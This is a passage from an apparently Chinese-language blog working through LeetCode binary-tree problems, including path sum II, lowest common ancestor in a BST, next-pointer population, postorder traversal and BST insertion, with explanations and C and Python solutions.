class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">struct TreeNode* <span class="title">buildTree</span><span class="params">(<span class="keyword">int</span>* inorder, <span class="keyword">int</span> inorderSize, <span class="keyword">int</span>* postorder, <span class="keyword">int</span> postorderSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!inorderSize || !postorderSize)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> * <span class="title">node</span> = (<span class="title">struct</span> <span class="title">TreeNode</span>*)<span class="title">malloc</span>(<span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">TreeNode</span>));</span></span><br><span class="line">    <span class="keyword">int</span> root = postorder[postorderSize<span class="number">-1</span>];</span><br><span class="line">    </span><br><span class="line">    node-&gt;val = root;</span><br><span class="line">    <span class="keyword">int</span> left;</span><br><span class="line">    <span class="keyword">for</span>(left = <span class="number">0</span>;left&lt;inorderSize;left++)</span><br><span class="line">        <span class="keyword">if</span>(inorder[left] == root)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> right = inorderSize - left - <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    node-&gt;left = buildTree(inorder, left, postorder, left);</span><br><span class="line">    node-&gt;right = buildTree(inorder + left + <span class="number">1</span>, right, postorder + left, right);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> node;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/25/sYMeb6NL3aSJxdC.png" alt="R8JMRM38V_UU7NZ_F0_6WO6.png"></p><h3 id="26-113-路径总和-II（中等）"><a href="#26-113-路径总和-II（中等）" class="headerlink" title="26 - 113. 路径总和 II（中等）"></a>26 - <a href="https://leetcode-cn.com/problems/path-sum-ii/" target="_blank" rel="noopener">113. 路径总和 II（中等）</a></h3><blockquote><p>给定一个二叉树和一个目标和，找到所有从根节点到叶子节点路径总和等于给定目标和的路径。</p><p>说明: 叶子节点是指没有子节点的节点。</p><p>示例:<br>给定如下二叉树，以及目标和 sum = 22，</p><pre><code>      5     / \\    4   8   /   / \\  11  13  4 /  \\    / \\7    2  5   1</code></pre><p>返回:</p><p>[<br>   [5,4,11,2],<br>   [5,8,4,5]<br>]</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/path-sum-ii" target="_blank" rel="noopener">https://leetcode-cn.com/problems/path-sum-ii</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><h4 id="解法：深度优先搜索（DFS）-递归中序遍历"><a href="#解法：深度优先搜索（DFS）-递归中序遍历" class="headerlink" title="解法：深度优先搜索（DFS）+ 递归中序遍历"></a>解法：深度优先搜索（DFS）+ 递归中序遍历</h4><p>中序遍历，一层一层地搜下去就完事了，用一个栈来保存路径，遇到叶子结点且刚好到了这一层时sum已经被减到0了就保存路径</p><p>需要注意的是<strong>在每一层搜索结束后都要将该层结点弹出栈</strong></p><p>构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Return an array of arrays of size *returnSize.</span></span><br><span class="line"><span class="comment"> * The sizes of the arrays are returned as *returnColumnSizes array.</span></span><br><span class="line"><span class="comment"> * Note: Both returned array and *columnSizes array must be malloced, assume caller calls free().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">int</span> **retn;</span><br><span class="line"><span class="keyword">int</span> *<span class="built_in">set</span>;</span><br><span class="line"><span class="keyword">int</span> nums;</span><br><span class="line"><span class="keyword">int</span> retn_nums;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(struct TreeNode* root, <span class="keyword">int</span> sum, <span class="keyword">int</span>** returnColumnSizes)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    </span><br><span class="line">    sum -= root-&gt;val;</span><br><span class="line">    <span class="built_in">set</span>[nums++] = root-&gt;val;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!root-&gt;left &amp;&amp; !root-&gt;right &amp;&amp; !sum)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> * path = (<span class="keyword">int</span>*) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>) * nums);</span><br><span class="line">        <span class="built_in">memcpy</span>(path, <span class="built_in">set</span>, <span class="keyword">sizeof</span>(<span class="keyword">int</span>) * nums);</span><br><span class="line">        (*returnColumnSizes)[retn_nums] = nums;</span><br><span class="line">        retn[retn_nums++] = path;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    dfs(root-&gt;left,sum,returnColumnSizes);</span><br><span class="line">    dfs(root-&gt;right,sum,returnColumnSizes);</span><br><span class="line">    nums--;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span>** <span class="title">pathSum</span><span class="params">(struct TreeNode* root, <span class="keyword">int</span> sum, <span class="keyword">int</span>* returnSize, <span class="keyword">int</span>** returnColumnSizes)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    retn_nums = nums = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">set</span> = (<span class="keyword">int</span>*) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*<span class="number">1000</span>);</span><br><span class="line">    retn = (<span class="keyword">int</span>**)<span class="built_in">calloc</span>(<span class="number">1000</span>,<span class="keyword">sizeof</span>(<span class="keyword">int</span>*));</span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">    &#123;</span><br><span class="line">        *returnSize = <span class="number">0</span>;</span><br><span class="line">        (*returnColumnSizes)[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    dfs(root,sum,returnColumnSizes);</span><br><span class="line">    *returnSize = retn_nums;</span><br><span class="line">    <span class="keyword">return</span> retn;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/26/oqx2CRyb9JMavBZ.png" alt="image.png"></p><h3 id="27-235-二叉搜索树的最近公共祖先（简单）"><a href="#27-235-二叉搜索树的最近公共祖先（简单）" class="headerlink" title="27 - 235. 二叉搜索树的最近公共祖先（简单）"></a>27 - <a href="https://leetcode-cn.com/problems/lowest-common-ancestor-of-a-binary-search-tree/" target="_blank" rel="noopener">235. 二叉搜索树的最近公共祖先（简单）</a></h3><blockquote><p>给定一个二叉搜索树, 找到该树中两个指定节点的最近公共祖先。</p><p>百度百科中最近公共祖先的定义为：“对于有根树 T 的两个结点 p、q，最近公共祖先表示为一个结点 x，满足 x 是 p、q 的祖先且 x 的深度尽可能大（一个节点也可以是它自己的祖先）。”</p><p>例如，给定如下二叉搜索树:  root = [6,2,8,0,4,7,9,null,null,3,5]</p><p>示例 1:</p><p>输入: root = [6,2,8,0,4,7,9,null,null,3,5], p = 2, q = 8<br>输出: 6<br>解释: 节点 2 和节点 8 的最近公共祖先是 6。<br>示例 2:</p><p>输入: root = [6,2,8,0,4,7,9,null,null,3,5], p = 2, q = 4<br>输出: 2<br>解释: 节点 2 和节点 4 的最近公共祖先是 2, 因为根据定义最近公共祖先节点可以为节点本身。</p><p>说明:</p><p>所有节点的值都是唯一的。<br>p、q 为不同节点且均存在于给定的二叉搜索树中。</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/lowest-common-ancestor-of-a-binary-search-tree" target="_blank" rel="noopener">https://leetcode-cn.com/problems/lowest-common-ancestor-of-a-binary-search-tree</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><h4 id="解法：深度优先搜索（DFS）"><a href="#解法：深度优先搜索（DFS）" class="headerlink" title="解法：深度优先搜索（DFS）"></a>解法：深度优先搜索（DFS）</h4><p>二叉搜索树（BST）有一个很重要的性质就是<strong>左子树所有结点都小于当前节点，右子树所有结点都大于当前结点</strong>，所以我们可以直接通过比较结点的值来进行判断</p><p>构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function">struct TreeNode* <span class="title">lowestCommonAncestor</span><span class="params">(struct TreeNode* root, struct TreeNode* p, struct TreeNode* q)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(p == q)</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">bool</span> flag1 = p-&gt;val &gt; root-&gt;val;</span><br><span class="line">    <span class="keyword">bool</span> flag2 = q-&gt;val &gt; root-&gt;val;</span><br><span class="line">    <span class="keyword">if</span>(flag1 != flag2)</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(p == root || q == root)</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(flag1)</span><br><span class="line">        <span class="keyword">return</span> lowestCommonAncestor(root-&gt;right,p,q);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> lowestCommonAncestor(root-&gt;left,p,q);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/27/1sudkorBnCPqV5l.png" alt="@_I_39NAGH0__CROGOJD4XX.png"></p><blockquote><p>早睡早起身体好（确信</p></blockquote><h3 id="28-117-填充每个节点的下一个右侧节点指针-II（中等）"><a href="#28-117-填充每个节点的下一个右侧节点指针-II（中等）" class="headerlink" title="28 - 117. 填充每个节点的下一个右侧节点指针 II（中等）"></a>28 - <a href="https://leetcode-cn.com/problems/populating-next-right-pointers-in-each-node-ii/" target="_blank" rel="noopener">117. 填充每个节点的下一个右侧节点指针 II（中等）</a></h3><blockquote><p>给定一个二叉树</p><p>struct Node {<br>  int val;<br>  Node *left;<br>  Node *right;<br>  Node *next;<br>}<br>填充它的每个 next 指针，让这个指针指向其下一个右侧节点。如果找不到下一个右侧节点，则将 next 指针设置为 NULL。</p><p>初始状态下，所有 next 指针都被设置为 NULL。</p><p>进阶：</p><p>你只能使用常量级额外空间。<br>使用递归解题也符合要求，本题中递归程序占用的栈空间不算做额外的空间复杂度。</p><p>示例：</p><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2019/02/15/117_sample.png" alt="image.png"></p><p>输入：root = [1,2,3,4,5,null,7]<br>输出：[1,#,2,3,#,4,5,7,#]<br>解释：给定二叉树如图 A 所示，你的函数应该填充它的每个 next 指针，以指向其下一个右侧节点，如图 B 所示。</p><p>提示：</p><p>树中的节点数小于 6000<br>-100 &lt;= node.val &lt;= 100</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/populating-next-right-pointers-in-each-node-ii" target="_blank" rel="noopener">https://leetcode-cn.com/problems/populating-next-right-pointers-in-each-node-ii</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><h4 id="解法一：层次遍历"><a href="#解法一：层次遍历" class="headerlink" title="解法一：层次遍历"></a>解法一：层次遍历</h4><p>我们考虑到当我们填充next指针将每一层的结点都连接起来后，<strong>该层所有结点便构成了一个单向链表</strong>，我们可以<strong>通过遍历每一层的链表来构造下一层的链表</strong></p><p>大致过程如下图</p><p><img src="https://i.loli.net/2020/09/28/485DnfumcRterSM.png" alt="BD12E33FCF6E3B97FC6DB3AF5B645CF2.png"></p><h4 id="时间复杂度：-2"><a href="#时间复杂度：-2" class="headerlink" title="时间复杂度："></a>时间复杂度：</h4><p>由于每个结点都要遍历一次，故时间复杂度为<strong>O</strong>(<strong>N</strong>)</p><h4 id="空间复杂度：-2"><a href="#空间复杂度：-2" class="headerlink" title="空间复杂度："></a>空间复杂度：</h4><p>由于没有使用到额外的空间，故空间复杂度为<strong>O</strong>(<strong>1</strong>)</p><h4 id="C语言版：-1"><a href="#C语言版：-1" class="headerlink" title="C语言版："></a>C语言版：</h4><p>我么可以得到如下代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * Definition for a Node.</span><br><span class="line"> * struct Node &#123;</span><br><span class="line"> *     int val;</span><br><span class="line"> *     struct Node *left;</span><br><span class="line"> *     struct Node *right;</span><br><span class="line"> *     struct Node *next;</span><br><span class="line"> * &#125;;</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">struct Node * last_node, *next_start;</span><br><span class="line"></span><br><span class="line">void connectList(struct Node * node)</span><br><span class="line">&#123;</span><br><span class="line">    if(last_node)</span><br><span class="line">    &#123;</span><br><span class="line">        last_node-&gt;next &#x3D; node;</span><br><span class="line">    &#125;</span><br><span class="line">    if(!next_start)</span><br><span class="line">    &#123;</span><br><span class="line">        next_start &#x3D; node;</span><br><span class="line">    &#125;</span><br><span class="line">    last_node &#x3D; node;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">struct Node *connect(struct Node *root) </span><br><span class="line">&#123;</span><br><span class="line">    if (!root)</span><br><span class="line">        return NULL;</span><br><span class="line"></span><br><span class="line">    struct Node *start &#x3D; root;</span><br><span class="line">    while(start)</span><br><span class="line">    &#123;</span><br><span class="line">        last_node &#x3D; NULL, next_start &#x3D; NULL;</span><br><span class="line">        while(start)</span><br><span class="line">        &#123;</span><br><span class="line">            if(start-&gt;left)</span><br><span class="line">                connectList(start-&gt;left);</span><br><span class="line">            if(start-&gt;right)</span><br><span class="line">                connectList(start-&gt;right);</span><br><span class="line">            start &#x3D; start-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        start &#x3D; next_start;</span><br><span class="line">    &#125;</span><br><span class="line">    return root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/28/tmKaLsnblvDce9H.png" alt="_XU940OX_R1_5XJK_H@N~5I.png"></p><h4 id="Python语言版：-2"><a href="#Python语言版：-2" class="headerlink" title="Python语言版："></a>Python语言版：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string"># Definition for a Node.</span></span><br><span class="line"><span class="string">class Node:</span></span><br><span class="line"><span class="string">    def __init__(self, val: int = 0, left: 'Node' = None, right: 'Node' = None, next: 'Node' = None):</span></span><br><span class="line"><span class="string">        self.val = val</span></span><br><span class="line"><span class="string">        self.left = left</span></span><br><span class="line"><span class="string">        self.right = right</span></span><br><span class="line"><span class="string">        self.next = next</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.last_node: <span class="string">'Node'</span></span><br><span class="line">        self.next_start: <span class="string">'Node'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">connect</span><span class="params">(self, root: <span class="string">'Node'</span>)</span> -&gt; 'Node':</span></span><br><span class="line">        <span class="keyword">if</span> root == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> root</span><br><span class="line"></span><br><span class="line">        start = root</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> start != <span class="literal">None</span>:</span><br><span class="line">            self.last_node = <span class="literal">None</span></span><br><span class="line">            self.next_start = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> start != <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">if</span> start.left != <span class="literal">None</span>:</span><br><span class="line">                    <span class="keyword">if</span> self.last_node != <span class="literal">None</span>:</span><br><span class="line">                        self.last_node.next = start.left</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> self.next_start == <span class="literal">None</span>:</span><br><span class="line">                        self.next_start = start.left</span><br><span class="line"></span><br><span class="line">                    self.last_node = start.left</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> start.right != <span class="literal">None</span>:</span><br><span class="line">                    <span class="keyword">if</span> self.last_node != <span class="literal">None</span>:</span><br><span class="line">                        self.last_node.next = start.right</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> self.next_start == <span class="literal">None</span>:</span><br><span class="line">                        self.next_start = start.right</span><br><span class="line"></span><br><span class="line">                    self.last_node = start.right</span><br><span class="line"></span><br><span class="line">                start = start.next</span><br><span class="line"></span><br><span class="line">            start = self.next_start</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> root</span><br><span class="line">                </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">connectList</span><span class="params">(self, node: <span class="string">'Node'</span>)</span>:</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.last_node != <span class="literal">None</span>:</span><br><span class="line">            self.last_node.next = node</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.next_start == <span class="literal">None</span>:</span><br><span class="line">            self.next_start = node</span><br><span class="line"></span><br><span class="line">        self.last_node = node</span><br></pre></td></tr></table></figure><p>![XTJUK27UN3_66_OSL5`_BZB.png](<a href="https://i.loli.net/2020/09/28/ywXFL85CP4Zm2B6.png" target="_blank" rel="noopener">https://i.loli.net/2020/09/28/ywXFL85CP4Zm2B6.png</a>)</p><h3 id="29-145-二叉树的后序遍历（中等）"><a href="#29-145-二叉树的后序遍历（中等）" class="headerlink" title="29 - 145. 二叉树的后序遍历（中等）"></a>29 - <a href="https://leetcode-cn.com/problems/binary-tree-postorder-traversal/" target="_blank" rel="noopener">145. 二叉树的后序遍历（中等）</a></h3><blockquote><p>给定一个二叉树，返回它的 后序 遍历。</p><p>示例:</p><p>输入: [1,null,2,3]<br>   1<br>    <br>     2<br>    /<br>   3 </p><p>输出: [3,2,1]<br>进阶: 递归算法很简单，你可以通过迭代算法完成吗？</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/binary-tree-postorder-traversal" target="_blank" rel="noopener">https://leetcode-cn.com/problems/binary-tree-postorder-traversal</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><h4 id="解法一：深度优先搜索（DFS）-递归后续遍历"><a href="#解法一：深度优先搜索（DFS）-递归后续遍历" class="headerlink" title="解法一：深度优先搜索（DFS） + 递归后续遍历"></a>解法一：深度优先搜索（DFS） + 递归后续遍历</h4><p>后序遍历的顺序是<strong>左→右→根</strong>，使用递归可以三分钟内解决</p><h4 id="时间复杂度：-3"><a href="#时间复杂度：-3" class="headerlink" title="时间复杂度："></a>时间复杂度：</h4><p>每个结点都过一遍，所以时间复杂度是<strong>O</strong>(<strong>N</strong>)</p><h4 id="空间复杂度：-3"><a href="#空间复杂度：-3" class="headerlink" title="空间复杂度："></a>空间复杂度：</h4><p>每个结点都要开辟一个单独的栈帧空间，故空间复杂度为<strong>O</strong>(<strong>N</strong>)</p><p>构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note: The returned array must be malloced, assume caller calls free().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">int</span> * retn;</span><br><span class="line"><span class="keyword">int</span> <span class="built_in">size</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(struct TreeNode* root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(root-&gt;left)</span><br><span class="line">        dfs(root-&gt;left);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(root-&gt;right)</span><br><span class="line">        dfs(root-&gt;right);</span><br><span class="line"></span><br><span class="line">    retn[<span class="built_in">size</span>++] = root-&gt;val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span>* <span class="title">postorderTraversal</span><span class="params">(struct TreeNode* root, <span class="keyword">int</span>* returnSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">    &#123;</span><br><span class="line">        *returnSize = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    retn = (<span class="keyword">int</span>*) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*<span class="number">1000</span>);</span><br><span class="line">    <span class="built_in">size</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    dfs(root);</span><br><span class="line">    *returnSize = <span class="built_in">size</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retn;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/29/Smo2vrKwWfjH1Ta.png" alt="_B35__WY2L_Z`E_`27DA_FM.png"></p><h3 id="30-701-二叉搜索树中的插入操作（中等）"><a href="#30-701-二叉搜索树中的插入操作（中等）" class="headerlink" title="30 - 701. 二叉搜索树中的插入操作（中等）"></a>30 - <a href="https://leetcode-cn.com/problems/insert-into-a-binary-search-tree/" target="_blank" rel="noopener">701. 二叉搜索树中的插入操作（中等）</a></h3><blockquote><p>给定二叉搜索树（BST）的根节点和要插入树中的值，将值插入二叉搜索树。 返回插入后二叉搜索树的根节点。 输入数据保证，新值和原始二叉搜索树中的任意节点值都不同。</p><p>注意，可能存在多种有效的插入方式，只要树在插入后仍保持为二叉搜索树即可。 你可以返回任意有效的结果。</p><p>例如, </p><p>给定二叉搜索树:</p><pre><code>    4   / \  2   7 / \1   3</code></pre><p>和 插入的值: 5<br>你可以返回这个二叉搜索树:</p><pre><code>     4   /   \  2     7 / \   /1   3 5</code></pre><p>或者这个树也是有效的:</p><pre><code>     5   /   \  2     7 / \   1   3     \      4</code></pre><p>提示：</p><p>给定的树上的节点数介于 0 和 10^4 之间<br>每个节点都有一个唯一整数值，取值范围从 0 到 10^8<br>-10^8 